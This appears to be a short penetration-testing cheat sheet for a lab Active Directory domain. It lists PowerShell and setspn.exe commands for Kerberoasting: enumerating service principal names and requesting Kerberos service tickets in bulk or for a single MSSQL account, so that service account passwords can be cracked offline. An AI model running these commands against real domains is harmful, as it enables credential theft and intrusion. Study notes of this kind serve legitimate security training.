---
type: tool
category: AD
tags:
  - tool
---
# Overview

## Commands

### Kerboroasting - setspn.exe
####  Enumerating SPNs - setspn.exe
```powershell
setspn.exe -Q */*
```

#### Retrieving all Tickets - setspn.exe

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
#### Targeting a Single User
1. We will load the needed "Kerberos-library":
```powershell
Add-Type -AssemblyName System.IdentityModel
```
2. Afterwards we can request the Ticket, it will be loaded into the RAM:
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```


## Important Parameter
